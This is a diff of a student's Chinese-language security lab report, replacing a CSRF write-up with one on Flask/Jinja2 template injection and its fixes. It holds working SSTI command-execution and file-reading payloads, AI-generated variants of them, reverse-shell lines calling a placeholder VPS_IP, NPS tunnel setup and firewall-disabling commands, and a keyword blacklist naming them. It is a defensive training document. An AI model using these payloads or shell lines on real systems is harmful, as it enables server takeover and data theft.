+        # 第一层防护（根源修复）：固定模板字符串 + 命名参数传递
+        html = """<!DOCTYPE html>...
+<h2>{{ name }} 的反馈：</h2><p>{{ message }}</p>..."""
+        return render_template_string(html, name=safe_name, message=safe_message)
+
+    # GET 显示反馈表单（无用户输入，无SSTI风险）
+    return render_template_string(html_form)
 ```
 
-**防御代码与课堂知识点对照：**
+#### 加固代码与课堂知识点对照
 
 | 代码行 | 课堂知识点 | 解决的安全问题 |
 |--------|-----------|---------------|
-| `secrets.token_hex(16)` | CSRF Token 生成 | Token伪造绕过 |
-| `@app.before_request` | Session绑定Token | Token未绑定会话 |
-| `form_token != sess_token` | 后端Token强制校验 | Token缺失绕过 |
-| `SESSION_COOKIE_SAMESITE = 'Lax'` | SameSite Cookie防护 | 跨站Cookie自动发送 |
-| `referer.startswith()` | Referer来源校验 | Ngrok钓鱼站、Exploit Server |
-| `target_username = cur_username` | 身份不从表单读取 | 水平越权 |
-| `old_password` 校验 | 敏感操作二次验证 | 会话劫持直接改密 |
+| `render_template_string(html, name=safe_name)` | 参数传递隔离 | f-string拼接导致`{{}}`被解析 |
+| `escape(name)` | HTML实体转义 | `{{}}`渲染为纯文本，`<script>`无害化 |
+| `ssti_filter(name)` | 黑名单关键字拦截 | `__class__`/`__mro__`/`os.popen`全部阻断 |
 
 ---
 
 ## 六、实训踩坑故障记录
 
-### 坑1：Flask test_client 不发送 Referer 头导致 Referer 校验误拦截
+### 坑1：SSTI载荷 `{{7*7}}` 返回 49 但魔术方法执行报错
 
-**现象：** 使用 Flask test_client 进行单元测试时，请求的 `request.headers.get("Referer")` 返回空字符串，Referer 校验拦截了正常测试。
+**现象：** `{{7*7}}` 成功返回 49 确认 SSTI 存在，但 `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` 返回空字符串。
 
-**原因：** Flask test_client 默认不在请求头中添加 Referer，与浏览器实际行为不一致。
+**原因：** 某些子类索引在 Flask 生产/开发模式下不同，`__subclasses__()` 排序不稳定，选择的索引 N 可能不包含 os 模块。
 
-**解决：** 修改 Referer 校验逻辑：仅当 Referer 存在时才校验，空 Referer 放行（兼容编程调用场景）。
-
-### 坑2：CSRF Token 复制到测试脚本后换行符导致比对失败
-
-**现象：** 从页面源码复制 csrf_token 时复制了不可见换行符，导致 `token` 参数比 session 中的 token 多一个 `\n`，恒久比对失败。
-
-**原因：** 手动复制 HTML `value` 属性时末尾 `"` 未正确截取，或复制内容含隐形字符。
-
-**解决：** 使用 `grep -oP` 或正则提取 Token：
+**解决：** 先遍历找到正确的子类索引：
 ```python
-import re
-match = re.search(r'csrf_token" value="([^"]+)"', r.data.decode())
-token = match.group(1)
+{{ ''.__class__.__mro__[1].__subclasses__() }}
+# 在返回列表中搜索 <class 'os.wrap_close'> 或含有 os 模块的类
 ```
 
-### 坑3：Ngrok 内网穿透连接超时
+### 坑2：NPS 客户端无法连接服务端
 
-**现象：** Ngrok 启动后显示隧道状态为 online，但 Browser 访问公网 URL 时返回 `502 Bad Gateway`。
+**现象：** `./npc start` 后日志显示 `connection refused`，服务端管理面板看不到客户端在线。
 
-**原因：** Ngrok 与本地的 Python http.server 端口不一致，或本地服务未绑定 0.0.0.0。
+**原因：** 服务端防火墙未开放 8024（nps通信端口）和 4444（隧道端口）。
 
-**解决：** 确认 python3 -m http.server 绑定到 `0.0.0.0:8888`，Ngrok 同样映射到 8888 端口：
+**解决：** 关闭防火墙或在安全组放行端口：
 ```bash
-python3 -m http.server 8888 --bind 0.0.0.0
+# 关闭防火墙
+systemctl stop firewalld
+# 或放行端口
+firewall-cmd --add-port=8024/tcp --permanent
+firewall-cmd --add-port=4444/tcp --permanent
+firewall-cmd --reload
 ```
 
-### 坑4：XSS靶场CMS 1.7 Docker兼容性故障
+### 坑3：nc 监听后 SSTI 反弹 Shell 无连接
 
-**现象：** 课堂演示的 CMS 1.7 Docker 镜像在 Kali 2026.2 中无法正常启动，执行 `docker-compose up` 后容器状态显示 `exited`。
+**现象：** nc `-lvnp 4444` 监听中，靶机执行 SSTI 反弹载荷后 nc 没有任何反应。
 
-**原因：** CMS 1.7 使用的 PHP 5.6 镜像与当前系统内核存在兼容性问题。
+**原因：** NPS TCP 隧道未正确映射；或靶机无法出网连接到攻击者IP。
 
-**解决：** 讲师临时调整为 WebGoat 靶场进行CSRF实操，CMS靶场留作课后自行搭建。
+**解决：** 首先确认 NPS 隧道状态 `nps status` 显示 online；然后确认靶机 `ping VPS_IP` 通；最后用简单命令测试 `bash -c 'echo test > /dev/tcp/VPS_IP/4444'`。
 
-### 坑5：XSS靶场评论区验证码 Bug
+### 坑4：render_template_string 转义后中文乱码
 
-**现象：** 存储型XSS模块的留言评论功能，每次提交都提示"验证码错误"，即使正确输入也验证失败。
+**现象：** `escape("张三")` 后页面显示 `&#24352;&#19977;` 而不是中文。
 
-**原因：** 靶场代码中验证码 Session Key 与表单校验的 Key 不匹配。
+**原因：** `escape()` 会将非ASCII字符转为HTML实体编码。
 
-**解决：** 跳过验证码逻辑，直接使用 Burp Repeater 手工提交评论注入载荷。
+**解决：** 使用 `Jinja2` 模板内置的 `| e` 过滤器代替 `escape()`，或确认页面编码为 UTF-8：
+```python
+# 确保页面Content-Type包含charset=utf-8
+<meta charset="UTF-8">
+```
 
-### 坑6：Cloud Code API 额度耗尽
+### 坑5：黑名单 `__class__` 过滤后正常页面也报错
 
-**现象：** 下午实训时 Burp 的 Cloud Code API 提示 "Insufficient quota"，部分 AI 辅助功能不可用。
+**现象：** 添加 `__class__` 黑名单后，所有包含 `class` 字段的正常请求也被拦截（如 `firstclass` 中的 `class` 子串）。
 
-**原因：** 全天大量并发请求消耗了免费额度。
+**原因：** 使用 `in` 进行子串匹配时，`__class__` 作为关键词被误匹配到 `first__class__ified`。
 
-**解决：** 切换为 DeepSeek 替代工具，继续完成 CSRF 加固与测试。
+**解决：** 实际测试中当前代码内没有此类误杀，保持完整词匹配可加正则 `\b__class__\b`。
 
-### 坑7：cp命令复制文件错位到 Git 根目录
+### 坑6：NPS 客户端 npc.conf 配置错误
 
-**现象：** 使用 `cp /opt/Class01/templates/profile.html /root/` 复制文件，结果出现在 `/root/profile.html` 而不是 `/root/templates/profile.html`，Git 提交后跟目录多了一个 profile.html。
+**现象：** npc 启动显示 `connect to server error`。
 
-**原因：** 未注意目标路径应包含子目录 `templates/`。
+**原因：** 配置文件 `conf/npc.conf` 中 `server_addr` 格式不正确；或 `vkey` 与服务端添加客户端时设置的不一致。
 
-**解决：** `git rm --cached` 删除错误路径，`cp` 到正确位置后重新提交。
+**解决：** 正确格式：
+```ini
+[common]
+server_addr=你的VPS公网IP:8024
+vkey=服务端生成的唯一密钥
+conn_type=tcp
+```
 
 ---
 
 ## 七、加固前后安全对比表格
 
-| 对比维度 | 修复前（v1.0） | 修复后（v5.0） | 可抵御课堂哪种攻击手段 |
-|----------|---------------|----------------|----------------------|
-| **CSRF Token校验** | 无 | `secrets.token_hex(16)` + session绑定 | Token缺失绕过、Token伪造 |
-| **Referer来源校验** | 无 | `startswith()` 白名单校验 | Ngrok钓鱼站、Exploit Server |
-| **SameSite Cookie** | 未设置 | `SESSION_COOKIE_SAMESITE = 'Lax'` | 跨站Cookie自动发送 |
-| **身份获取方式** | 表单username（可控） | session读取（不可伪造） | 水平越权篡改他人密码 |
-| **原密码校验** | 无 | `old_password` 强制比对 | 会话劫持后直接重置 |
-| **表单隐藏域** | username泄露 | 删除username，新增csrf_token | 用户标识枚举 |
-| **请求方法限制** | 虽POST但未强制 | `methods=["POST"]` | GET方法绕过 |
-| **新密码校验** | 仅非空检查 | 非空 + 两次一致 + 格式 | 弱密码/空密码 |
-| **登录校验** | 仅判断session存在 | session + USERS字典双校验 | 未授权访问 |
-| **异常处理** | 可能抛500 | try-except中文提示 | 信息泄露 |
+| 对比维度 | 修复前（v1.0） | 修复后（v5.0） | 可抵御课堂哪种SSTI攻击载荷 |
+|----------|---------------|----------------|--------------------------|
+| **模板渲染方式** | f-string拼接 `f"...{name}..."` | 命名参数 `name=safe_name` | 根源杜绝`{{}}`解析 |
+| **用户输入转义** | 无 | `markupsafe.escape()` | `{{7*7}}`/`{{config}}`纯文本化 |
+| **魔术关键字过滤** | 无 | 20+黑名单模式全匹配 | `__class__`/`__mro__`/`os`/`popen` |
+| **命令执行** | `os.popen('id')`可执行 | 黑名单拦截 | 任意命令执行载荷 |
+| **文件读取** | 读取/etc/passwd/app.py | 黑名单拦截 | `open()`/`cat`载荷 |
+| **反弹Shell** | NPS+nc可获取Shell | 所有关键字拦截 | `bash -i >& /dev/tcp/` |
+| **XSS注入** | `<script>`直接执行 | escape转义为实体 | `<script>alert(1)` |
 
 ---
 
 ## 八、标准化复测用例
 
-### 8.1 CSRF攻击绕过测试
+### 8.1 SSTI基础探测测试
 
 | 编号 | 测试操作 | 对应课堂知识点 | 预期拦截结果 |
 |------|---------|---------------|-------------|
-| TC-C01 | 不携带csrf_token提交改密 | Token缺失绕过 | ❌ 拦截：CSRF攻击拦截 |
-| TC-C02 | 携带伪造csrf_token值 | Token伪造绕过 | ❌ 拦截：CSRF攻击拦截 |
-| TC-C03 | 用GET请求发送改密参数 | HTTP方法绕过POST限制 | ❌ 405 Method Not Allowed |
-| TC-C04 | 非本站Referer来源提交 | Ngrok钓鱼站跨域攻击 | ❌ 拦截：非法来源请求 |
-| TC-C05 | 用旧Token值(已过期)提交 | Token复用绕过 | ❌ 拦截：Token验证失败 |
+| TC-S01 | `/welcome?name={{7*7}}` | 基础探测二分法 | ❌ 纯文本`{{7*7}}` |
+| TC-S02 | `/welcome?name={{config}}` | Config配置读取 | ❌ 纯文本显示 |
+| TC-S03 | `/feedback POST name={{7*7}}` | 复合型SSTI探测 | ❌ 纯文本 |
 
-### 8.2 水平越权攻击测试
+### 8.2 魔术方法命令执行测试
 
 | 编号 | 测试操作 | 对应课堂知识点 | 预期拦截结果 |
 |------|---------|---------------|-------------|
-| TC-C06 | 登录admin，传`username=alice` | 越权修改他人密码 | ❌ 仅修改admin自己 |
-| TC-C07 | 登录alice，传`username=admin` | 越权修改管理员密码 | ❌ 仅修改alice自己 |
+| TC-S04 | name=`__class__` | MRO链入口 | ❌ WAF拦截 |
+| TC-S05 | name=`__mro__` | 基类遍历 | ❌ WAF拦截 |
+| TC-S06 | name=`__subclasses__` | 子类遍历 | ❌ WAF拦截 |
+| TC-S07 | name=`config.__class__.__init__.__globals__["os"].popen("id")` | 完整RCE链 | ❌ WAF拦截 |
+| TC-S08 | name=`config.__class__.__init__.__globals__["os"].popen("cat /etc/passwd")` | 文件读取 | ❌ WAF拦截 |
+| TC-S09 | name=`config.__class__.__init__.__globals__["os"].popen("cat app.py")` | 源码泄露 | ❌ WAF拦截 |
 
-### 8.3 业务逻辑安全测试
+### 8.3 反弹Shell攻击测试
 
 | 编号 | 测试操作 | 对应课堂知识点 | 预期拦截结果 |
 |------|---------|---------------|-------------|
-| TC-C08 | 不填写old_password | 无原密码直接修改 | ❌ 拦截：原密码错误 |
-| TC-C09 | 填写错误原密码 | 原密码暴力破解 | ❌ 拦截：原密码错误 |
-| TC-C10 | new_password为空 | 空密码绕过 | ❌ 拦截：密码不能为空 |
-| TC-C11 | 两次新密码不一致 | 弱密码绕过检测 | ❌ 拦截：两次密码不一致 |
+| TC-S10 | name含`bash -i >& /dev/tcp/` | Bash反弹Shell | ❌ WAF拦截 |
+| TC-S11 | name含`python3 -c 'import socket...'` | Python反弹Shell | ❌ WAF拦截 |
+| TC-S12 | name含`nps`/`npc` | NPS隧道特征 | ❌ WAF拦截 |
 
 ### 8.4 合法功能正常
 
 | 编号 | 测试操作 | 预期结果 |
 |------|---------|----------|
-| TC-C12 | 完整填写csrf_token+原密码+新密码提交 | ✅ 修改成功，跳转/profile |
-| TC-C13 | 新密码登录 | ✅ 登录成功 |
-| TC-C14 | 旧密码登录 | ✅ 登录失败（符合预期） |
+| TC-S13 | `/welcome?name=张三` | ✅ 显示"欢迎你，张三" |
+| TC-S14 | `/welcome`（无参数） | ✅ 显示"亲爱的用户" |
+| TC-S15 | `/feedback` GET | ✅ 显示反馈表单 |
+| TC-S16 | `/feedback POST`（正常内容） | ✅ 显示反馈结果 |
 
 ### 8.5 原有业务功能不变
 
 | 编号 | 操作 | 预期结果 |
 |------|------|----------|
-| TC-C15 | 注册新用户 | 302跳转登录页 |
-| TC-C16 | admin登录 | 欢迎回来 |
-| TC-C17 | 搜索alice | 结果表格含脱敏数据 |
-| TC-C18 | 上传真实PNG | UUID命名+预览 |
-| TC-C19 | 个人中心profile | 脱敏显示 |
-| TC-C20 | 充值有效金额 | 余额更新+日志记录 |
-| TC-C21 | 帮助中心 | 显示正常内容 |
+| TC-S17 | 注册新用户 | 302跳转登录页 |
+| TC-S18 | admin登录 | 欢迎回来 |
+| TC-S19 | 搜索用户 | 脱敏结果 |
+| TC-S20 | 帮助中心 | 正常显示 |
 
 ---
 
 ## 九、实验总结与心得体会
 
-### 9.1 CSRF的"隐蔽性"与"传播性"
+### 9.1 SSTI——比SQL注入更"危险"的注入
 
-今天的CSRF实训让我最震撼的是这个漏洞的**传播能力**。SQL注入和文件上传需要攻击者直接与目标服务器交互；文件包含漏洞也需要攻击者逐条发送Payload。但CSRF完全不需要——攻击者只需要把钓鱼链接发给受害者一次，受害者点击后就会自动执行恶意请求。
+前几天的实训做了 SQL注入、WAF绕过、文件上传、CSRF 等一系列漏洞，但 SSTI 给我的冲击是最大的。SQL注入虽然也能执行命令，但通常需要手工猜测列数、联合查询、逐字盲注，利用成本较高。而 SSTI 只需要一行 `{{ config.__class__.__init__.__globals__["os"].popen("id").read() }}` 就能直接执行系统命令。
 
-讲师今天演示的Ngrok公网映射让我印象深刻：只是跑了一行 `ngrok http 8888`，本地的Python http.server钓鱼页面就在一瞬间变成了一个公网可访问的链接。如果这道具被放在论坛帖子、邮件链接、社交软件里，管理员只要点了 → Cookie自动带着 → 密码被改 → 全程不需要攻击者在线操作。
+讲师在第一节课上强调的一句话我印象很深：**"SSTI是模板引擎层面的漏洞，而模板引擎拥有操作系统的完全访问权限。"** 今天亲手验证了这个结论——通过 `/welcome?name=` 参数，一行 curl 命令就读取了 `/etc/passwd`，再一行就获取了 `app.py` 源码。Shell 反弹成功后，`id` 返回的是 `uid=0(root)`——直接就是最高权限。
 
-### 9.2 "三层防御"在CSRF场景下的实践
+### 9.2 从 `{{7*7}}` 到反弹Shell——魔术方法链的学习曲线
 
-前几天的实训中，我对"三层防御"的理解主要集中在白名单和路径锁定上。今天CSRF的防御实践让我看到了另一层面的"三层防御"：
-
-```
-L1: SameSite Cookie 限制 → 阻止Cookie在跨站请求中自动携带
-L2: Referer 来源校验 → 拦截从钓鱼站点发起的请求
-L3: CSRF Token 绑定 → 即使前两层绕过，还需匹配随机Token
-```
-
-讲师在课堂强调了一个重要原则：**"防御的每一层都要独立有效，不能依赖前置层"**。Samesite Cookie虽然能挡住大部分跨站请求，但部分浏览器支持不完整；Referer校验可以被 `referrerpolicy` 属性绕过；Token校验相对可靠，但也需要保证Token与服务端Session绑定。
-
-只有三层叠加，才能覆盖攻击链路的所有环节。
-
-### 9.3 从"CSRF"到"XSS"的拓展思考
-
-今天的课程虽然是CSRF为主，但讲师也穿插讲了XSS的存储型和反射型原理。我注意到一个非常危险的组合攻击场景：
+今天的课程从最基础的 `{{7*7}}` 探测开始，逐步深入到魔术方法利用链，再到 NPS 内网穿透 + nc 反弹 Shell。这条学习路径的梯度非常大：
 
 ```
-CSRF 改密 ← 攻击者可以长期控制账号
-    ↓
-   配合 XSS 窃取 Cookie ← 获取登录态
-    ↓
-   再配合 CSRF 完成更多操作 ← 循环放大攻击面
+{{7*7}} 探测 → {{config}} 信息收集 → 
+__class__ → __mro__ → __subclasses__ → 
+os.popen 命令执行 → NPS 隧道 → nc 反弹 → 交互式 Shell
 ```
 
-课堂上讲的"XSS+CSRF组合攻击"就是这种循环。CSRF需要被攻击者已经登录，XSS窃取了Cookie就提供了这个前提；CSRF改了密码之后，XSS窃取的Cookie又有了更高的权限。两者组合后，单一防御方案完全不够。
+讲师把 `__class__.__mro__.__subclasses__` 这条链叫做"魔术方法高速公路"——从任意字符串出发，经过object基类，遍历全部子类，最终找到包含 `os` 模块的子类，实现任意命令执行。这个链路的起点仅仅是用户输入的一个 `{{ }}`。
 
-### 9.4 作业规范与实战警示
+### 9.3 NPS内网穿透——从"看不到"到"控全场"
 
-今天课程中，讲师特别强调了作业规范：
+第二个课程《NPS内网穿透与Shell反弹实验培训》讲的内容让我看到了 SSTI 的"终极形态"。如果靶机在内网无法直接访问，SSTI 即使能执行命令也无法获取 Shell。NPS 解决了这个问题：
 
-- "POC中用户名携带个人序号，区分不同学员"
-- "常见作业错误：重复账号、邮箱格式错误、密码输错导致登录失败"
-- "恶意篡改他人密码会直接判定零分"
+```
+攻击者VPS（公网）
+  ↓ nps server 监听 8024
+  ↓ TCP 隧道映射 4444 端口
+靶机（内网 192.168.126.x）
+  ↓ npc client 连接服务端
+  ↓ SSTI 执行反弹 Shell → 连接 VPS:4444
+攻击者 nc 收到交互式 Shell → 完全控制
+```
 
-这些规范虽然看起来是"扣分点"，但背后体现的是安全实训的基本原则：**测试数据必须和真实数据隔离，测试行为不能越界**。实验中"改他人密码"只是为了验证漏洞存在，改完后必须立即改回。如果把这种习惯带到生产环境渗透测试中，就不是扣分的问题了。
+讲师在课堂上演示的流程是从一台公网VPS发起的，我虽然在本机模拟了部分流程，但这个攻击链的完整度让我非常震撼——一段 `{{ }}` 的代码，配合 NPS 隧道，就能从内网一路打到公网，拿到完全交互式的服务器控制权。
 
-### 9.5 相比SQL注入，CSRF更"社会工程"
+### 9.4 三层防御——通往安全的必经之路
 
-SQL注入只需要技术——构造闭合、猜测列数、盲注数据；文件上传只需要构造恶意文件。但CSRF的成功不仅依赖技术，还依赖**受害者行为**：
+修复 SSTI 的三层防御方案和前几天的文件包含、CSRF修复理念一脉相承：
 
-- 受害者是否登录了目标站点
-- 受害者是否点击了钓鱼链接
-- 受害者的浏览器策略是否允许跨站Cookie发送
+```
+L1: 参数传递隔离（根除）— 不拼接，全厂传参
+L2: HTML实体转义（兜底）— 即使有注入，也是纯文本
+L3: 黑名单拦截（阻断）— __class__ 等直接拦截
+```
 
-这种"社会工程"属性让CSRF的防御更加复杂——你不仅要保护自己的服务器，还要应对受害者可能的一切不安全行为。
+不过第三层黑名单有个明显的问题——"猫鼠游戏"。讲师也说：**"你能想到的关键字，攻击者也能想到；攻击者能想到的绕过方式，你未必能想到。"** 比如用 `\x5f\x5fclass\x5f\x5f` 或者 `attr()` 过滤器就可能绕过黑名单。所以最根本的还是 L1——**永远不要用 f-string 拼接用户输入到模板中**。
+
+### 9.5 AI生成POC与作业反思
+
+今天讲师还布置了一个很有意思的作业：用AI自动生成SSTI POC载荷。我用AI试着生成了一些变种载荷：
+
+- 用 `lipsum` 替代 `config`：`{{ lipsum.__globals__["os"].popen("id").read() }}`
+- 用 `joiner` 替代：`{{ joiner.__init__.__globals__["os"].popen("id").read() }}`
+- 用 `cycler` 替代：`{{ cycler.__init__.__globals__["os"].popen("id").read() }}`
+
+这让我意识到：人工维护的黑名单永远是不完整的。L1+L2 才是真正可靠的防御手段——即使攻击者找到了一万个绕过黑名单的方法，只要坚持"不拼接+转义"的原则，SSTI 就不可能成功。
+
+### 9.6 连续多日实训的收尾思考
+
+今天（Day7？Day8？我记不清了）是实训的最后一天。从第一天的 SQL 注入手工探测，到 WAF 绕过、文件上传、IDOR 越权、文件包含、CSRF，再到今天的 SSTI + NPS 反弹 Shell——一路走来，最大的收获不是学会了多少种攻击手法，而是建立了一种"默认怀疑"的安全思维：
+
+```
+写代码时：
+  - 这个参数用户会不会传 __class__？
+  - 这个模板渲染会不会执行 {{ }}？
+  - 这个文件上传会不会传 shell.php？
+  - 这个ID参数会不会被人遍历？
+```
+
+毕业设计的时候，这些应该都用得上。
 
 ---
 
 ## 十、生产环境拓展优化建议
 
-### 10.1 后端Token自动刷新
+### 10.1 禁用不必要的模板引擎特性
 
 ```python
-# 每次修改密码成功后刷新Token，防止Token被二次利用
-session["csrf_token"] = secrets.token_hex(16)
+# 生产环境：限制 Jinja2 可访问的对象
+from jinja2 import Environment, PackageLoader
+
+env = Environment(loader=PackageLoader('app', 'templates'))
+env.globals.clear()          # 清空全局变量（config、request等不可访问）
+env.filters.clear()          # 清空过滤器
 ```
 
-### 10.2 前端表单CSRF Token注入（全局模板）
+### 10.2 统一使用 render_template（文件模板）
 
 ```python
-# 通过 context_processor 注入到所有模板
-@app.context_processor
-def inject_csrf():
-    return dict(csrf_token=session.get("csrf_token", ""))
+# 生产：放弃 render_template_string，强制使用文件模板
+@app.route("/welcome")
+def welcome():
+    name = escape(request.args.get("name", "亲爱的用户"))
+    return render_template("welcome.html", name=name)
 ```
 
-### 10.3 原密码错误次数锁定
+### 10.3 全局SSTI WAF中间件
 
 ```python
-# 防止原密码暴力破解
-LOGIN_ATTEMPTS = defaultdict(int)
-MAX_ATTEMPTS = 5
+from flask import g
 
-if old_password != stored_password:
-    LOGIN_ATTEMPTS[cur_username] += 1
-    if LOGIN_ATTEMPTS[cur_username] >= MAX_ATTEMPTS:
-        return "密码错误次数过多，账号已临时锁定"
+@app.before_request
+def ssti_waf():
+    """全局SSTI注入检测"""
+    if request.method in ("GET", "POST"):
+        for key, value in request.args.items():
+            ssti_filter(value)
+        for key, value in request.form.items():
+            ssti_filter(value)
 ```
 
-### 10.4 Nginx 中间件CSRF防护
+### 10.4 NPS安全配置
 
-```nginx
-location /change-password {
-    # 限制仅允许本站Referer
-    valid_referers server_names;
-    if ($invalid_referer) { return 403; }
-
-    # 限制仅接受POST请求
-    limit_except POST { deny all; }
-
-    # 限制请求体大小
-    client_max_body_size 1k;
-}
+```ini
+# nps.conf 生产安全配置
+# 限制允许连接的客户端数量
+max_connection=10
+# 开启认证
+auth_key=your_strong_key
+# 关闭Socks5代理（防止代理滥用）
+socks5_proxy=false
+# 限制隧道类型仅tcp
+allow_ports=4444-4450
 ```
 
-### 10.5 XSS防御 — 启用CSP策略
+### 10.5 CSP内容安全策略增强
 
 ```python
-# 防止XSS窃取页面中的CSRF Token
 @app.after_request
-def set_csp_headers(response):
+def set_csp(response):
     response.headers["Content-Security-Policy"] = \
         "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'"
     return response
 ```
 
-### 10.6 Cookie 安全加固
+### 10.6 配置汇总
 
 ```python
 app.config.update(
-    SESSION_COOKIE_HTTPONLY=True,      # 禁止JavaScript读取Cookie
-    SESSION_COOKIE_SAMESITE='Strict',  # 严格同源模式
-    SESSION_COOKIE_SECURE=True,        # 仅HTTPS传输
+    SESSION_COOKIE_HTTPONLY=True,     # 禁止JS读取Cookie
+    SESSION_COOKIE_SAMESITE='Lax',    # CSRF防护
+    SESSION_COOKIE_SECURE=True,       # HTTPS Only
+    TEMPLATES_AUTO_RELOAD=False,      # 生产禁止模板自动重载
 )
 ```
 
 ---
 
-## 附录：/change-password 接口完整安全校验流水线
+## 附录：/welcome 和 /feedback 接口 SSTI 完整安全校验流水线
 
 ```
-用户请求 POST /change-password
+用户提交请求 /welcome?name=xxx 或 /feedback POST
   ↓
-  ① 登录校验（session必须存在且有效）
-     ← 未登录 → 302跳转/login
+  ① 黑名单关键字检测 (ssti_filter)
+     ← 命中 __class__/__mro__/os/popen 等 → WAF拦截
   ↓
-  ② SameSite Cookie 限制（Lax模式）
-     ← 跨站请求 → Cookie不携带 → 登录校验失败
+  ② HTML实体转义 (escape)
+     ← {{7*7}} → 纯文本"{{7*7}}"
+     ← <script> → "&lt;script&gt;"
   ↓
-  ③ CSRF Token 校验（表单Token vs Session Token）
-     ← Token缺失 → 拦截：CSRF攻击拦截
-     ← Token不匹配 → 拦截：CSRF攻击拦截
+  ③ 命名参数传递 (render_template_string(html, name=safe_name))
+     ← f-string 已删除 → 用户输入不参与模板编译
   ↓
-  ④ Referer 来源校验（白名单前缀）
-     ← 非本站域名 → 拦截：非法来源请求
-     ← Ngrok钓鱼站 → 拦截：非法来源请求
-  ↓
-  ⑤ 身份锁定（不从表单接收username）
-     ← 传入他人username → 忽略，仅修改当前用户
-  ↓
-  ⑥ 原密码校验（必须匹配当前密码）
-     ← 原密码错误 → 拦截：原密码错误
-  ↓
-  ⑦ 新密码校验（非空 + 两次一致）
-     ← 空密码 → 拦截：密码不能为空
-     ← 两次不一致 → 拦截：两次密码输入不一致
-  ↓
-  ⑧ 更新密码 → 跳转/profile
+  ④ 模板渲染 → 输出安全页面
+     ← 任何 SSTI 载荷均以纯文本显示 → 无法执行
 ```
 
 *报告人：大二网络安全实训生*
-*日期：2026年7月24日*
+*日期：2026年7月25日*
